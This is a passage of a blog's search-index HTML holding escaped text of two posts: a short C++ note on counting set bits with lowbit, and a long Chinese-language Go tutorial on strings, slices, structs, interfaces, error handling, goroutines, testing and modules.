&lt;p&gt;一个数11000100，那么其反码是00111011，补码是00111100，那么11000100与00111100相与结果为：00000010&lt;/p&gt;
&lt;p&gt;那么一个数的二进制表示中1的个数可以用上述方法反复计算，每次计算出来后就在原书的基础上减去，直至为0为止。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int x;
int cnt = 0;
while(x)
{
    x -= lowbit(x);
    cnt ++;
}

int lowbit(int x)
{
    return x &amp;amp; (-x);
}

&lt;/code&gt;&lt;/pre&gt;
">【算法】位运算</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/go-golang/"" data-c="
          &lt;h4 id=&#34;语言结构&#34;&gt;语言结构&lt;/h4&gt;
&lt;p&gt;包声明：第一行代码必须使用&lt;code&gt;package xxx&lt;/code&gt;指明该文件属于哪个包。&lt;/p&gt;
&lt;p&gt;引入包：后面导入包，用双引号引起。&lt;/p&gt;
&lt;p&gt;导出名：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在 Go 中，如果一个名字以大写字母开头，那么它就是已导出的。例如，&lt;code&gt;Pizza&lt;/code&gt; 就是个已导出名，&lt;code&gt;Pi&lt;/code&gt; 也同样，它导出自 &lt;code&gt;math&lt;/code&gt; 包。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;执行go程序&#34;&gt;执行go程序&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;go run hello.go&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;还可以使用&lt;code&gt;go build hello.go&lt;/code&gt;编译成二进制文件。&lt;/p&gt;
&lt;p&gt;左花括号{不能单独放在一行。&lt;/p&gt;
&lt;h3 id=&#34;数据类型&#34;&gt;数据类型&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;布尔型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数字类型&lt;/p&gt;
&lt;p&gt;int、float32、float64&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;字符串类型&lt;/p&gt;
&lt;p&gt;字符串是不可变字节序列，其本身是一个复合结构。&lt;/p&gt;
&lt;p&gt;字符串默认值不是nil而是&amp;quot;&amp;quot;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;var str string
fmt.Println(str == &amp;quot;&amp;quot;) // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;[]byte和[]rune类型的区别：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;str := &amp;quot;strings&amp;quot;
fmt.Println([]rune(str)) // [103 111 35821 35328]
fmt.Println([]byte(str)) // [103 111 232 175 173 232 168 128]
// 字符串是utf-8的一个序列，当字符串为ASCⅡ码表上的字符则占用1个字节，其他字符根据需要占用2-4个字节。

// 可以看出rune的长度是4，byte长度是8，这是因为rune是使用utf-8编码，当字符可以使用ASCⅡ表示时，其占一个字节，其他字符根据需要占用2-4个字节。

// byte就是具体的字节个数，使用内置函数len()得到的是字符串的byte长度。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;字符串的内容(纯字节)可以通过索引来获取，对字符串中的每个utf-8字符访问可以通过rune类型：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;for i, ru := range str{
    // i为索引
    // ru为uft-8字符
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;除了可以使用双引号外，还可以使用反引号``：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;str := `line 1
line 2
line 3
\r\n
`
fmt.Println(str)
/*
line 1
line 2
line 3
\r\n
*/
// 可以看出它不对转移字符进行解析，即按照原文本输出。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;常见的字符串操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;字符串比较&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Compare 函数，用于比较两个字符串的大小，如果两个字符串相等，返回为 0。如果 a 小于 b ，返回 -1 ，反之返回 1 。不推荐使用这个函数，直接使用 == != &amp;gt; &amp;lt; &amp;gt;= &amp;lt;= 等一系列运算符更加直观。
func Compare(a, b string) int 
//   EqualFold 函数，计算 s 与 t 忽略字母大小写后是否相等。
func EqualFold(s, t string) bool

a := &amp;quot;gopher&amp;quot;
b := &amp;quot;hello world&amp;quot;
fmt.Println(strings.Compare(a, b)) // -1
fmt.Println(strings.Compare(a, a)) // 0
fmt.Println(strings.Compare(b, a)) // 1
fmt.Println(strings.EqualFold(&amp;quot;GO&amp;quot;, &amp;quot;go&amp;quot;)) // true
fmt.Println(strings.EqualFold(&amp;quot;壹&amp;quot;, &amp;quot;一&amp;quot;)) // false
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;子串&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 子串 substr 在 s 中，返回 true
func Contains(s, substr string) bool
// chars 中任何一个 Unicode 代码点在 s 中，返回 true
func ContainsAny(s, chars string) bool
// Unicode 代码点 r 在 s 中，返回 true
func ContainsRune(s string, r rune) bool

fmt.Println(strings.ContainsAny(&amp;quot;team&amp;quot;, &amp;quot;i&amp;quot;)) // false
fmt.Println(strings.ContainsAny(&amp;quot;failure&amp;quot;, &amp;quot;u &amp;amp; i&amp;quot;)) // true
fmt.Println(strings.ContainsAny(&amp;quot;in failure&amp;quot;, &amp;quot;s g&amp;quot;)) // true
fmt.Println(strings.ContainsAny(&amp;quot;foo&amp;quot;, &amp;quot;&amp;quot;)) // false
fmt.Println(strings.ContainsAny(&amp;quot;&amp;quot;, &amp;quot;&amp;quot;)) // false

// 子串出现几次
func Count(s, sep string) int
fmt.Println(strings.Count(&amp;quot;cheese&amp;quot;, &amp;quot;e&amp;quot;)) // 3
fmt.Println(len(&amp;quot;谷歌中国&amp;quot;)) // 12
fmt.Println(strings.Count(&amp;quot;谷歌中国&amp;quot;, &amp;quot;&amp;quot;)) // 5
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;字符串分割&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func Split(s, sep string) []string

fmt.Printf(&amp;quot;%q\n&amp;quot;, strings.Split(&amp;quot;foo,bar,baz&amp;quot;, &amp;quot;,&amp;quot;))

// 如果按照空格分开，这种方式不会忽略连续的空格，这种情况使用strings.Fields(strings)
strings.Fields(str)
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;前后缀&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// s 中是否以 prefix 开始
func HasPrefix(s, prefix string) bool {
  return len(s) &amp;gt;= len(prefix) &amp;amp;&amp;amp; s[0:len(prefix)] == prefix
}
// s 中是否以 suffix 结尾
func HasSuffix(s, suffix string) bool {
  return len(s) &amp;gt;= len(suffix) &amp;amp;&amp;amp; s[len(s)-len(suffix):] == suffix
}

fmt.Println(strings.HasPrefix(&amp;quot;Gopher&amp;quot;, &amp;quot;&amp;quot;)) // true
fmt.Println(strings.HasSuffix(&amp;quot;Amigo&amp;quot;, &amp;quot;go&amp;quot;)) // true
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;字符或子串在字符串中出现的位置&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 在 s 中查找 sep 的第一次出现，返回第一次出现的索引
func Index(s, sep string) int
// 在 s 中查找字节 c 的第一次出现，返回第一次出现的索引
func IndexByte(s string, c byte) int
// chars 中任何一个 Unicode 代码点在 s 中首次出现的位置
func IndexAny(s, chars string) int
// 查找字符 c 在 s 中第一次出现的位置，其中 c 满足 f(c) 返回 true
func IndexFunc(s string, f func(rune) bool) int
// Unicode 代码点 r 在 s 中第一次出现的位置
func IndexRune(s string, r rune) int

han := func(c rune) bool {
    return unicode.Is(unicode.Han, c) // 汉字
}
fmt.Println(strings.IndexFunc(&amp;quot;Hello, world&amp;quot;, han)) // -1
fmt.Println(strings.IndexFunc(&amp;quot;Hello, 世界&amp;quot;, han)) // 7
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将字符串数组连接起来&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// func Join(a []string, sep string) string

fmt.Println(strings.Join([]string{&amp;quot;name=xxx&amp;quot;, &amp;quot;age=xx&amp;quot;}, &amp;quot;&amp;amp;&amp;quot;)) // name=xxx&amp;amp;age=xx
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;字符串重复几次&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func Repeat(s string, count int) string
fmt.Println(&amp;quot;ba&amp;quot; + strings.Repeat(&amp;quot;na&amp;quot;, 2)) // banana
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;字符替换&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func Map(mapping func(rune) rune, s string) string
// Map 函数，将 s 的每一个字符按照 mapping 的规则做映射替换，如果 mapping 返回值 &amp;lt;0 ，则舍弃该字符。该方法只能对每一个字符做处理，但处理方式很灵活，可以方便的过滤，筛选汉字等。

mapping := func(r rune) rune {
    switch {
    case r &amp;gt;= &#39;A&#39; &amp;amp;&amp;amp; r &amp;lt;= &#39;Z&#39;: // 大写字母转小写
        return r + 32
    case r &amp;gt;= &#39;a&#39; &amp;amp;&amp;amp; r &amp;lt;= &#39;z&#39;: // 小写字母不处理
        return r
    case unicode.Is(unicode.Han, r): // 汉字换行
        return &#39;\n&#39;
    }
    return -1 // 过滤所有非字母、汉字的字符
}
fmt.Println(strings.Map(mapping, &amp;quot;Hello你#￥%……\n（&#39;World\n,好Hello^(&amp;amp;(*界gopher...&amp;quot;))
/*
hello
world
hello
gopher
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;字符串子串替换&lt;/p&gt;
&lt;p&gt;进行字符串替换时，考虑到性能问题，能不用正则尽量别用，应该用这里的函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 用 new 替换 s 中的 old，一共替换 n 个。
// 如果 n &amp;lt; 0，则不限制替换次数，即全部替换
func Replace(s, old, new string, n int) string
// 该函数内部直接调用了函数 Replace(s, old, new , -1)
func ReplaceAll(s, old, new string) string

fmt.Println(strings.Replace(&amp;quot;oink oink oink&amp;quot;, &amp;quot;k&amp;quot;, &amp;quot;ky&amp;quot;, 2)) // oinky oinky oink
fmt.Println(strings.Replace(&amp;quot;oink oink oink&amp;quot;, &amp;quot;oink&amp;quot;, &amp;quot;moo&amp;quot;, -1)) // moo moo moo
fmt.Println(strings.ReplaceAll(&amp;quot;oink oink oink&amp;quot;, &amp;quot;oink&amp;quot;, &amp;quot;moo&amp;quot;)) // moo moo moo
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;派生类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;指针类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数组类型&lt;/p&gt;
&lt;p&gt;数组必须类型和长度一致才算做是同一种类型。&lt;/p&gt;
&lt;p&gt;数组是值类型的，赋值和传参都是复制整个数组。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 初始化
var a [3]int // {0,0,0}自动初始化为0
b := [4]int{1, 2} // {1,2,0,0}未初始化的位置初始化为0
c := [4]int{1, 3:10} //{1,0,0,10}指定索引位置初始化
d := [...]int{1,2,3} // 编译器按照初始化数量确定数组长度
// 对于符合类型初始化，可省略类型标签
type user struct {
    name string,
    age byte
}
e := [...]user {
    {&amp;quot;Tom&amp;quot;, 20},
    {&amp;quot;Sam&amp;quot;, 21},
}
// 二维数组支持第一维使用...
f := [...][2]int{
    {1,2},
    {3,4},
}

  // 动态二维数组
var a [][]int
for i := 0; i &amp;lt; 10; i++ {
    var tmp []int
    for j:= 0; j &amp;lt; 10; j++ {
        tmp = append(tmp, j)
    }
    a = append(a, tmp)
}
     
row, column := 3, 4
var answer [][]int
for i := 0; i &amp;lt; row; i++ {
    inline := make([]int, column)
    answer = append(answer, inline)
}
// 用切片创建
answer1 := make([][]int, row)
for i := range answer1 {
    answer1[i] = make([]int, column)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;结构化类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Channel类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;函数类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;切片类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接口类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Map类型&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;数据类型转化：&lt;code&gt;float64(num)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;常量也是前面加const，且不能用&lt;code&gt;:=&lt;/code&gt;定义&lt;/p&gt;
&lt;h3 id=&#34;数据定义&#34;&gt;数据定义&lt;/h3&gt;
&lt;p&gt;函数以外的语句都必须以关键字开始，例如var、func等，因此&lt;code&gt;:=&lt;/code&gt;只能在函数内使用。&lt;/p&gt;
&lt;p&gt;没有初始化的变量会被赋予零值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数值类型为0&lt;/li&gt;
&lt;li&gt;布尔类型为false&lt;/li&gt;
&lt;li&gt;字符串为&amp;quot;&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;结构体&#34;&gt;结构体&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type struct_name struct {
    v1 string
    v2 string
    v3 int
}

v := struct_name {v1, v2, ..., vn}
v := struct_name {key1: v1, key2:v2, ..., keyn:vn}
v.v1 = &amp;quot;...&amp;quot;

// 指针
sp := &amp;amp;v
sp.v1 = &amp;quot;...&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;结构体排序&#34;&gt;结构体排序&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 排序用到了sort包
import &amp;quot;sort&amp;quot;

// 常见的三种排序函数 sort.Ints sort.Floats sort.Strings是对于[]int []float []string

// 使用自定义排序函数 sort.Slice和sort.SliceStable，后者是稳定排序，包含两个参数，第一个是待排序的数组，第二个是排序函数，示例：

family := []struct {
    Name string
    Age  int
}{
    {&amp;quot;Alice&amp;quot;, 23},
    {&amp;quot;David&amp;quot;, 2},
    {&amp;quot;Eve&amp;quot;, 2},
    {&amp;quot;Bob&amp;quot;, 25},
}
sort.SliceStable(family, func(i, j int) bool {
    return family[i].Age &amp;lt; family[j].Age
}) // 按照年龄排序


sort.SliceStable(family, func(i, j int) bool {
    if family[i].Age != family[j].Age {
        return family[i].Age &amp;lt; family[j].Age
    }
    return strings.Compare(family[i].Name, family[j].Name) == 1
})// 首先按照年龄排序，然后按照名字排序
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;语言切片&#34;&gt;语言切片&lt;/h3&gt;
&lt;p&gt;切片本身并非动态数组或数组指针。它内部通过指针引用底层数组，设定相关属性将数据读写限定在指定区域内。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;x := [...]int{0,1,2,3,4,5,6,7,8,9}
// 切片操作
/*	expression	slice					len	cap
	x[:]		[0,1,2,3,4,5,6,7,8,9]	10	10
	x[2:5]		[2,3,4]					3	8
	x[2:5:7]	[2,3,4]					3	5
	x[4:]		[4,5,6,7,8,9]			6	6
	x[:4]		[0,1,2,3]				4	10
	x[:4:6]		[0,1,2,3]				4	6
属性cap表示切片所引用数组片段的真实长度，len用于限定可读写的写元素数量。
*/

// 创建切片对象，引用类型，须使用make函数或显式初始化语句
s1 := make([]int, 3, 5) // 指定len、cap，底层数组初始化为0
s2 := make([]int, 3) // 不指定cap，和len相等

// 可以基于一个切片创建一个新的切片，二者都指向同一个底层数组，称为reslice
d := [...]int{0,1,2,3,4,5}
d1 := d[2:5]
d2 := d1[0:2]
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/* make参数

make(type, len, cap)
type: 切片类型
len: 切片长度
cap: 切片容量

*/
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 用reslice实现栈
stack := make([]int, 0, 5)

push := func(x int) error {
    n := len(stack)
    if n == cap(stack) {
        return errors.New(&amp;quot;stack is full&amp;quot;)
    }
    stack = stack[:n+1]
    stack[n] = x
    
    return nil
}

pop := func() (int, error) {
    n := len(stack)
    if n == 0 {
        return 0, errors.New(&amp;quot;stack is empty&amp;quot;)
    }
    
    x := stack[n-1]
    stack = stack[:n-1]
    
    return x, nil
}

for i := 0; i &amp;lt; 7; i++ {
    fmt.Printf(&amp;quot;push %d: %v, %v\n&amp;quot;, i, push(i), stack)
}

for i := 0; i &amp;lt; 7; i++ {
    x, err := pop()
    fmt.Printf(&amp;quot;pop %d, %v, %v\n&amp;quot;, x, err, stack)
}

/*
push 0: &amp;lt;nil&amp;gt;, [0]
push 1: &amp;lt;nil&amp;gt;, [0 1]
push 2: &amp;lt;nil&amp;gt;, [0 1 2]
push 3: &amp;lt;nil&amp;gt;, [0 1 2 3]
push 4: &amp;lt;nil&amp;gt;, [0 1 2 3 4]
push 5: stack is full, [0 1 2 3 4]
push 6: stack is full, [0 1 2 3 4]
pop 4, &amp;lt;nil&amp;gt;, [0 1 2 3]
pop 3, &amp;lt;nil&amp;gt;, [0 1 2]
pop 2, &amp;lt;nil&amp;gt;, [0 1]
pop 1, &amp;lt;nil&amp;gt;, [0]
pop 0, &amp;lt;nil&amp;gt;, []
pop 0, stack is empty, []
pop 0, stack is empty, []
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// append 向切片尾部添加数据，如果超出cap则重新分配数组
// 重新分配的数据的cap是原来数组cap的二倍，但并非都是2倍
s := make([]int, 0, 100)
s1 := s[:2:4]
s2 := append(s1, 1,2,3,4,5)

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// copy
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;函数&#34;&gt;函数&lt;/h3&gt;
&lt;p&gt;go函数的返回值可以被命名，会被视作定义在函数顶部的变量。&lt;/p&gt;
&lt;p&gt;没有参数的return会返回已经命名的返回值。&lt;/p&gt;
&lt;h3 id=&#34;接口&#34;&gt;接口&lt;/h3&gt;
&lt;p&gt;Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/* 定义接口 */
type interface_name interface {
   method_name1 [return_type]
   method_name2 [return_type]
   method_name3 [return_type]
   ...
   method_namen [return_type]
}

/* 定义结构体 */
type struct_name struct {
   /* variables */
}

/* 实现接口方法 */
func (struct_name_variable struct_name) method_name1() [return_type] {
   /* 方法实现 */
}
...
func (struct_name_variable struct_name) method_namen() [return_type] {
   /* 方法实现*/
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;错误处理&#34;&gt;错误处理&lt;/h3&gt;
&lt;p&gt;Go 语言通过内置的错误接口提供了非常简单的错误处理机制。&lt;/p&gt;
&lt;p&gt;error类型是一个接口类型，这是它的定义：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type error interface {
    Error() string
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们可以在编码中通过实现 error 接口类型来生成错误信息。&lt;/p&gt;
&lt;p&gt;函数通常在最后的返回值中返回错误信息。使用errors.New 可返回一个错误信息：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func Sqrt(f float64) (float64, error) {
    if f &amp;lt; 0 {
        return 0, errors.New(&amp;quot;math: square root of negative number&amp;quot;)
    }
    // 实现
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在下面的例子中，我们在调用Sqrt的时候传递的一个负数，然后就得到了non-nil的error对象，将此对象与nil比较，结果为true，所以fmt.Println(fmt包在处理error时会调用Error方法)被调用，以输出错误，请看下面调用的示例代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;result, err:= Sqrt(-1)

if err != nil {
   fmt.Println(err)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;并发&#34;&gt;并发&lt;/h3&gt;
&lt;p&gt;我们只需要通过 go 关键字来开启 goroutine 即可，同时go语言提供了sync和channel两种方式支持协程的并发。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;sync&lt;/p&gt;
&lt;p&gt;例如我们希望并发下载 N 个资源，多个并发协程之间不需要通信，那么就可以使用 sync.WaitGroup，等待所有并发协程执行结束。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import (
	&amp;quot;fmt&amp;quot;
	&amp;quot;sync&amp;quot;
	&amp;quot;time&amp;quot;
)

var wg sync.WaitGroup

func download(url string) {
	fmt.Println(&amp;quot;start to download&amp;quot;, url)
	time.Sleep(time.Second) // 模拟耗时操作
	wg.Done() // 减去一个计数
}

func main() {
	for i := 0; i &amp;lt; 3; i++ {
		wg.Add(1) // 为wg添加一个计数
		go download(&amp;quot;a.com/&amp;quot; + string(i+&#39;0&#39;))
	}
	wg.Wait() // 等待所有携程执行结束
	fmt.Println(&amp;quot;Done!&amp;quot;)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;channel&lt;/p&gt;
&lt;p&gt;使用 channel 信道，可以在协程之间传递消息。阻塞等待并发协程返回消息。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;var ch = make(chan string, 10) // 创建大小为 10 的缓冲信道

func download(url string) {
	fmt.Println(&amp;quot;start to download&amp;quot;, url)
	time.Sleep(time.Second)
	ch &amp;lt;- url // 将 url 发送给信道
}

func main() {
	for i := 0; i &amp;lt; 3; i++ {
		go download(&amp;quot;a.com/&amp;quot; + string(i+&#39;0&#39;))
	}
	for i := 0; i &amp;lt; 3; i++ {
		msg := &amp;lt;-ch // 等待信道返回消息。
		fmt.Println(&amp;quot;finish&amp;quot;, msg)
	}
	fmt.Println(&amp;quot;Done!&amp;quot;)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;channel是用来传递数据的一个数据结构。通道可用于两个 goroutine 之间通过传递一个指定类型的值来同步运行和通讯。操作符 &lt;code&gt;&amp;lt;-&lt;/code&gt; 用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;单元测试&#34;&gt;单元测试&lt;/h3&gt;
&lt;p&gt;假设我们希望测试 package main 下 &lt;code&gt;calc.go&lt;/code&gt; 中的函数，要只需要新建 &lt;code&gt;calc_test.go&lt;/code&gt; 文件，在&lt;code&gt;calc_test.go&lt;/code&gt;中新建测试用例即可。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// calc.go
package main

func add(num1 int, num2 int) int {
	return num1 + num2
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// calc_test.go
package main

import &amp;quot;testing&amp;quot;

func TestAdd(t *testing.T) {
	if ans := add(1, 2); ans != 3 {
		t.Error(&amp;quot;add(1, 2) should be equal to 3&amp;quot;)
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行 &lt;code&gt;go test&lt;/code&gt;，将自动运行当前 package 下的所有测试用例，如果需要查看详细的信息，可以添加&lt;code&gt;-v&lt;/code&gt;参数。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go test -v
=== RUN   TestAdd
--- PASS: TestAdd (0.00s)
PASS
ok      example 0.040s
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;包和模块&#34;&gt;包和模块&lt;/h3&gt;
&lt;h4 id=&#34;package&#34;&gt;Package&lt;/h4&gt;
&lt;p&gt;一般来说，一个文件夹可以作为 package，同一个 package 内部变量、类型、方法等定义可以相互看到。&lt;/p&gt;
&lt;p&gt;比如我们新建一个文件 &lt;code&gt;calc.go&lt;/code&gt;， &lt;code&gt;main.go&lt;/code&gt; 平级，分别定义 add 和 main 方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// calc.go
package main

func add(num1 int, num2 int) int {
	return num1 + num2
}
// main.go
package main

import &amp;quot;fmt&amp;quot;

func main() {
	fmt.Println(add(3, 5)) // 8
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行 &lt;code&gt;go run main.go&lt;/code&gt;，会报错，add 未定义：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./main.go:6:14: undefined: add
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为 &lt;code&gt;go run main.go&lt;/code&gt; 仅编译 main.go 一个文件，所以命令需要换成&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go run main.go calc.go
8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go run .
8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Go 语言也有 Public 和 Private 的概念，粒度是包。如果类型/接口/方法/函数/字段的首字母大写，则是 Public 的，对其他 package 可见，如果首字母小写，则是 Private 的，对其他 package 不可见。&lt;/p&gt;
&lt;h4 id=&#34;modules&#34;&gt;Modules&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/golang/go/wiki/Modules&#34;&gt;Go Modules&lt;/a&gt; 是 Go 1.11 版本之后引入的，Go 1.11 之前使用 $GOPATH 机制。Go Modules 可以算作是较为完善的包管理工具。同时支持代理，国内也能享受高速的第三方包镜像服务。接下来简单介绍 &lt;code&gt;go mod&lt;/code&gt; 的使用。Go Modules 在 1.13 版本仍是可选使用的，环境变量 GO111MODULE 的值默认为 AUTO，强制使用 Go Modules 进行依赖管理，可以将 GO111MODULE 设置为 ON。&lt;/p&gt;
&lt;p&gt;在一个空文件夹下，初始化一个 Module&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go mod init example
go: creating new go.mod: module example
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时，在当前文件夹下生成了&lt;code&gt;go.mod&lt;/code&gt;，这个文件记录当前模块的模块名以及所有依赖包的版本。&lt;/p&gt;
&lt;p&gt;接着，我们在当前目录下新建文件 &lt;code&gt;main.go&lt;/code&gt;，添加如下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import (
	&amp;quot;fmt&amp;quot;

	&amp;quot;rsc.io/quote&amp;quot;
)

func main() {
	fmt.Println(quote.Hello())  // Ahoy, world!
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行 &lt;code&gt;go run .&lt;/code&gt;，将会自动触发第三方包 &lt;code&gt;rsc.io/quote&lt;/code&gt;的下载，具体的版本信息也记录在了&lt;code&gt;go.mod&lt;/code&gt;中：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;module example

go 1.13

require rsc.io/quote v3.1.0+incompatible
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们在当前目录，添加一个子 package calc，代码目录如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;demo/
   |--calc/
      |--calc.go
   |--main.go
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 &lt;code&gt;calc.go&lt;/code&gt; 中写入&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package calc

func Add(num1 int, num2 int) int {
	return num1 + num2
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 package main 中如何使用 package cal 中的 Add 函数呢？&lt;code&gt;import 模块名/子目录名&lt;/code&gt; 即可，修改后的 main 函数如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import (
	&amp;quot;fmt&amp;quot;
	&amp;quot;example/calc&amp;quot;

	&amp;quot;rsc.io/quote&amp;quot;
)

func main() {
	fmt.Println(quote.Hello())
	fmt.Println(calc.Add(10, 3))
}

$ go run .
Ahoy, world!
13
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;一些思考问题&#34;&gt;一些思考问题&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;用内置delete函数对map元素进行删除后，内存会真的释放吗？&lt;/p&gt;
&lt;p&gt;不会。唯一的方法是重新创建一个map对旧map进行复制。https://github.com/golang/go/issues/20135&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
">【go】golang</a>
      </div>
      
      <div class="item">
